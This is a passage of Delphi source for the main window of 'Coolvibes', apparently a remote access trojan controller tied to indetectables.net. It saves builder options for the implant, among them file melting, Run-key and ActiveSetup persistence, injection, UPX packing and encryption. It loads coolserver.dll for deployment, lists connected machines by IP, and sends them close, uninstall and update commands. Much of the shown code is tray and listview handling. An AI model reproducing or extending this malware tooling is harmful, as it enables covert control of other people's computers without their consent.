      FormOpciones.CheckBoxPreguntarAlSalir.Checked);
    Ini.WriteBool('Opciones', 'MinimizarAlTray',
      FormOpciones.CheckBoxMinimizeToTray.Checked);
    Ini.WriteBool('Opciones', 'CerrarAlTray', FormOpciones.CheckBoxCloseToTray.Checked);
    Ini.WriteBool('Opciones', 'NotificacionMsn',
      FormOpciones.CheckBoxNotificacionMsn.Checked);
    Ini.WriteBool('Opciones', 'NotiMsnServerDesc',
      FormOpciones.CheckBoxNotiMsnDesc.Checked);
    Ini.WriteBool('Opciones', 'MandarPingAuto',
      FormOpciones.CheckBoxMandarPingAuto.Checked);
    Ini.WriteBool('Opciones', 'EscucharAlIniciar',
      FormOpciones.CheckBoxEscucharAlIniciar.Checked);
    Ini.WriteString('Opciones', 'PingTimerInterval', FormOpciones.EditPingTimerInterval.text);
    Ini.WriteBool('Opciones', 'AutoRefrescar',
      FormOpciones.CheckBoxAutoRefrescar.Checked);
    //Valores de la Form de Configuracion del server
    Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
    Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
    Ini.WriteString('ConfigurarServidor', 'NombrePlugin',
      FormConfigServer.EditPluginName.Text);
    Ini.WriteBool('ConfigurarServidor', 'CopiarArchivo',
      FormConfigServer.CheckBoxCopiar.Checked);
    Ini.WriteString('ConfigurarServidor', 'NombreArchivo',
      FormConfigServer.EditFileName.Text);
    Ini.WriteString('ConfigurarServidor', 'RutaCopiarA',
      FormConfigServer.EditCopyTo.Text);
    Ini.WriteBool('ConfigurarServidor', 'Melt', FormConfigServer.CheckBoxMelt.Checked);
    Ini.WriteBool('ConfigurarServidor', 'CopiarConFechaAnterior',
      FormConfigServer.CheckBoxCopiarConFechaAnterior.Checked);
    Ini.WriteBool('ConfigurarServidor', 'MetodoRun',
      FormConfigServer.CheckBoxRun.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorRun',
      FormConfigServer.EditRunName.Text);
    Ini.WriteBool('ConfigurarServidor', 'MetodoActiveSetup',
      FormConfigServer.CheckBoxActiveSetup.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorActiveSetup',
      FormConfigServer.EditActiveSetup.Text);
    Ini.WriteBool('ConfigurarServidor', 'Inyectar',
      FormConfigServer.CheckBoxInyectar.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Persistencia',
      FormConfigServer.CheckBoxPersistencia.Checked);
    Ini.WriteBool('ConfigurarServidor', 'ComprimirUPX',
      FormConfigServer.CheckBoxUPX.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Cifrar',
      FormConfigServer.CheckBoxCifrar.Checked);


      //Guardamos el estado de las columnas del Tlistview :D
      for i:=0 to Listviewconexiones.columns.Count-1 do
      begin
        //Ini.WriteString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', Listviewconexiones.columns[i].Caption);

        if listviewconexiones.columns[searchcolumnbyid(i)].MaxWidth <> 1 then
          Ini.WriteInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',Listviewconexiones.columns[searchcolumnbyid(i)].Width)
        else
          Ini.WriteInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',-1);

        Ini.WriteInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Index',Listviewconexiones.columns[searchcolumnbyid(i)].index);
      end;


    Ini.WriteInteger('AparienciaCliente', 'FormMainHeight',self.Height);
    Ini.WriteInteger('AparienciaCliente', 'FormMainWidth',self.Width);
    Ini.WriteInteger('AparienciaCliente', 'FormControlHeight',ControlHeight);
    Ini.WriteInteger('AparienciaCliente', 'FormControlWidth',ControlWidth);
  finally
    Ini.Free;
  end;
end;
//Termina Archivo .INI

procedure TFormMain.FormCreate(Sender: TObject);
var
  ServerFile             : File;
  Tamano                 : integer;
  i                      : integer;
begin
  Application.OnMinimize := MinimizeToTrayClick;
  //Inicializar el icono de la TrayBar
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.Wnd    := Handle;
  TrayIconData.uID    := 0;
  TrayIconData.uFlags := NIF_MESSAGE + NIF_ICON + NIF_TIP;
  TrayIconData.uCallbackMessage := WM_ICONTRAY;//el mensaje que deberemos interceptar
  TrayIconData.hIcon  := Application.Icon.Handle;
  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool);
  
  Shell_NotifyIcon(NIM_ADD, @TrayIconData);

  Self.Caption := 'Coolvibes '+VersionCool+' Update '+UpdateNum+' ::   [ www.indetectables.net ]';

  if fileexists(extractfiledir(paramstr(0))+'\Recursos\coolserver.dll')      then
  begin

    FileMode := 0;
    AssignFile(ServerFile, extractfiledir(paramstr(0))+'\Recursos\coolserver.dll');     //archivo de CoolServer
    Reset(ServerFile, 1);
    tamano := FileSize(ServerFile);
    SetLength(Servdll, tamano);
    BlockRead(ServerFile, Servdll[1], tamano);  //cargado archivo a servdll
    CloseFile(ServerFile);



  end
  else
    MessageDlg(_('CoolServer.dll no existe, no se podrán mandar servidores'), mtWarning, [mbOK], 0);


end;
// para el globo emergente
procedure TFormMain.GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
begin
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.uFlags := NIF_INFO;
  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
  TrayIconData.dwInfoFlags := tipo;
  //NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  {in my testing, the following code has no use}
  TrayIconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
  Shell_NotifyIcon(NIM_SETVERSION, @TrayIconData);
end;

procedure TFormMain.NotiMsnDesconect(tItem: TListItem);
var
  Mensaje, Titulo: string;
  Item: TListItem;
begin
  item    := tItem;
  Mensaje := 'La IP es :' + Item.SubItems[0];
  Titulo := Item.caption + ' Desconectandose';
  GloboEmergente(Titulo,Mensaje,NIIF_ERROR);
end;

procedure TFormMain.Traducir();
var
  Ini : Tinifile;
begin

    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + '\Recursos\Locale\Idioma.ini');
    self.Idioma := Ini.ReadString('Idioma', 'Idioma', 'NONE');

    
    if self.Idioma = 'NONE' then FormSeleccionarIdioma.ShowModal;
    Ini.WriteString('Idioma','Idioma',self.Idioma);
    Ini.Free;
    //Cargamos los archivos de idioma
    UseLanguage(Formmain.idioma);
    TranslateComponent(self);
    TranslateComponent(FormAbout);
    TranslateComponent(FormConfigServer);
    TranslateComponent(FormID);
    TranslateComponent(FormOpciones);
end;

procedure TFormMain.FormShow(Sender: TObject);
begin
  
  if PrimeraVezQueMeMuestro then
  begin
    PrimeraVezQueMeMuestro := False;
    WndMethod := ListViewConexiones.WindowProc;
    ListViewConexiones.WindowProc := CheckMesg;
    Traducir();
    StatusBar.Panels[0].Text := _('Estado: No escuchando');
    LeerArchivoINI();
    if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
      BtnEscuchar.Click;
    TimerMandarPing.Interval := strtointdef(FormOpciones.EditPingTimerInterval.Text, 30)*1000;
    TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;
  end;

end;


procedure TFormMain.TrayMessage(var Msg: TMessage);
var
  p: TPoint;
begin
  case Msg.lParam of
    WM_LBUTTONDOWN:
    begin
      MostrarOcultar1.Click;
    end;
    WM_RBUTTONDOWN:
    begin
      SetForegroundWindow(Handle);
      GetCursorPos(p);
      PopUpMenuTray.Popup(p.x, p.y);
      PostMessage(Handle, WM_NULL, 0, 0);
    end;
  end;
end;



procedure TFormMain.MostrarOcultar1Click(Sender: TObject);
begin
  if FormMain.Visible then //Ocultar
    MinimizeToTrayClick(Sender) //En esa procedure se esconde la form
  else
  begin //Mostrar
    Application.Restore;  {restore the application}
    if WindowState = wsMinimized then
      WindowState := wsNormal;  {Reset minimized state}
    Visible := True;
    SetForegroundWindow(Application.Handle); {Force form to the foreground }
  end;
end;

procedure TFormMain.Salir1Click(Sender: TObject);
begin
  FormMain.OnCloseQuery := nil;
  Close;
end;

procedure TFormMain.NotificacinestiloMSN1Click(Sender: TObject);
begin
  FormOpciones.CheckBoxNotificacionMSN.Checked := not NotificacinestiloMSN1.Checked;
end;

procedure TFormMain.PopupMenuTrayPopup(Sender: TObject);
begin
  NotificacinestiloMSN1.Checked := FormOpciones.CheckBoxNotificacionMsn.Checked;
end;


procedure TFormMain.MinimizeToTrayClick(Sender: TObject);
begin
  Hide;
  {hide the taskbar button}
  if IsWindowVisible(Application.Handle) then
    ShowWindow(Application.Handle, SW_HIDE);
end;

procedure TFormMain.wwwindetectablesnet1Click(Sender: TObject);
begin
  ShellExecute(Handle, 'open', 'http://www.indetectables.net', '', '', SW_SHOW);
end;

procedure TFormMain.TimerMandarPingTimer(Sender: TObject);
var
  i:integer;
  AThread: TIdPeerThread;
begin //Mandar Ping cada 30 segundos

  for i:=0 to listviewconexiones.Items.Count-1 do
  begin
    if ListViewConexiones.items[i].SubItems.Count > 5 then
    if((ListViewConexiones.items[i].SubItems[4] <> '.') and (ListViewConexiones.items[i].SubItems.Objects[0] <> nil) ) then //solo si no estamos mandando ping
    begin
      AThread := TidPeerThread(ListViewConexiones.items[i].SubItems.Objects[0]);
      AThread.Connection.WriteLn('PING');
      //Como objeto 2 guardamos una captura del tiempo en milisegundos
      ListViewConexiones.items[i].SubItems.Objects[2] := TObject(GetTickCount());
    end;
  end;
end;

procedure TFormMain.ListViewConexionesKeyPress(Sender: TObject;
  var Key: Char);
begin
  if key=#13 then Abrir1.Click;
end;

procedure TFormMain.ListViewConexionesColumnRightClick(Sender: TObject;
  Column: TListColumn; Point: TPoint);
begin
  listviewconexiones.PopupMenu := PopupMenuColumnas;
end;

procedure TFormMain.PopupMenuColumnasPopup(Sender: TObject);
begin
  listviewconexiones.PopupMenu := PopupMenuConexiones;
end;

Function TFormMain.SearchColumnById(ID:integer):integer;
var
  i : integer;
begin
  Result := 0;
  for i := 0 to listviewconexiones.Columns.Count-1 do
  begin
    if listviewconexiones.Columns[i].id = ID then
      Result := i;
  end;
end;

procedure TFormMain.Ip1Click(Sender: TObject);
var
  MI: TMenuItem;
begin
  MI := TMenuItem(sender);
  MI.Checked := not MI.Checked;

  if MI.Checked then
  begin
    listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].MaxWidth := 0;
    listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].Width := 100;
  end
  else
  begin
    listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].Width := 0;
    listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].MaxWidth := 1;
  end;
end;

procedure TFormMain.CheckMesg(var aMesg: TMessage); //http://www.delphi-zone.com/2010/11/how-to-prevent-resizing-of-listview-columns/
var
  HDNotify: ^THDNotify;
  NMHdr: pNMHdr;
  iCode: Integer;
  iIndex: Integer;
begin
  case aMesg.Msg of
    WM_NOTIFY:
      begin
        HDNotify := Pointer(aMesg.lParam);

        iCode := HDNotify.Hdr.code;
        if (iCode = HDN_BEGINTRACKW) or (iCode = HDN_BEGINTRACKA) then
        begin
          NMHdr := TWMNotify(aMesg).NMHdr;
          // chekck column index
          iIndex := GetIndex(NMHdr);
          if iindex = -1 then exit;
          if (PopupMenuColumnas.Items[iindex].Checked = false) then aMesg.Result := 1;
        end
        else
          WndMethod(aMesg);
      end;
    else
      WndMethod(aMesg);
  end;
end;

function  TFormMain.GetIndex(aNMHdr: pNMHdr): Integer;
var
  hHWND: HWND;
  HdItem: THdItem;
  iIndex: Integer;
  iResult: Integer;
  iLoop: Integer;
  sCaption: string;
  sText: string;
  Buf: array [0..128] of Char;
begin
  Result := -1;

  hHWND := aNMHdr^.hwndFrom;

  iIndex := pHDNotify(aNMHdr)^.Item;

  FillChar(HdItem, SizeOf(HdItem), 0);
  with HdItem do
  begin
    pszText    := Buf;
    cchTextMax := SizeOf(Buf) - 1;
    Mask       := HDI_TEXT;
  end;

  Header_GetItem(hHWND, iIndex, HdItem);
  Result := iIndex;
  exit;
  with ListViewConexiones do
  begin
    sCaption := Columns[iIndex].Caption;
    sText    := HdItem.pszText;
    iResult  := CompareStr(sCaption, sText);
    if iResult = 0 then
      Result := iIndex
    else
    begin
      iLoop := Columns.Count - 1;
      for iIndex := 0 to iLoop do
      begin
        iResult := CompareStr(sCaption, sText);
        if iResult <> 0 then
          Continue;

        Result := iIndex;
        break;
      end;
    end;
  end;
end;

procedure TFormMain.Cerrar1Click(Sender: TObject);
var
  i: integer;
  AThread: TIdPeerThread;
  mslistviewitem : TListItem;
begin
  if MessageBoxW(Handle,
      Pwidechar(_('¿Está seguro de que desea cerrar todos los servidores seleccionados? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
      pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    exit;
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
  begin
    AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
    AThread.Connection.WriteLn('SERVIDOR|CERRAR|');
    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;

procedure TFormMain.FormCanResize(Sender: TObject; var NewWidth,
  NewHeight: Integer; var Resize: Boolean);
begin
  if Newwidth < 505 then
    ImageTitulo.Visible := false
  else
    ImageTitulo.Visible := true;
end;

procedure TFormMain.Desinstalar1Click(Sender: TObject);
var
  i: integer;
  AThread: TIdPeerThread;
  mslistviewitem : TListItem;
begin
   MessageDlg(_('De momento no funciona esta función :-)'), mtWarning, [mbOK], 0);//opción no dispobible de momento ;)
  exit;
  if MessageBoxW(Handle,
      Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
      pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
  begin
    AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
    AThread.Connection.WriteLn('SERVIDOR|DESINSTALAR|');
    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;

procedure TFormMain.Actualizar1Click(Sender: TObject);
var
  i: integer;
  AThread: TIdPeerThread;
  mslistviewitem : TListItem;
begin
  if MessageBoxW(Handle,
      Pwidechar(_('¿Está seguro de que desea actualizar los servidores seleccionados? ¡Se volverá a enviar coolserver.dll!')),
      pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    exit;
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
  begin
    AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
    AThread.Connection.WriteLn('SERVIDOR|ACTUALIZAR|');
    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
  end;
end;



procedure TFormMain.StatusBarMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
var
  mpt : TPoint;
  j : integer;
  panel : integer;
begin
  if not self.Showing then exit;
  if not self.Active then exit;
  mpt := Mouse.CursorPos;
  mpt := StatusBar.ScreenToClient(mpt);
  panel := -1;
  x := 0;
  for j := 0 to StatusBar.Panels.Count - 1 do
  begin
    x := x + StatusBar.Panels[j].Width;
    if mpt.x < x then
    begin
      panel := j;
      Break;
    end;
  end;
  if panel = 1 then
    statusbar.Cursor := CrHandPoint
  else
    statusbar.Cursor := CrDefault;
end;

procedure TFormMain.StatusBarClick(Sender: TObject);
begin
  if statusbar.Cursor = CrHandPoint then
    FormEstadisticasConexiones.show;
end;

end.
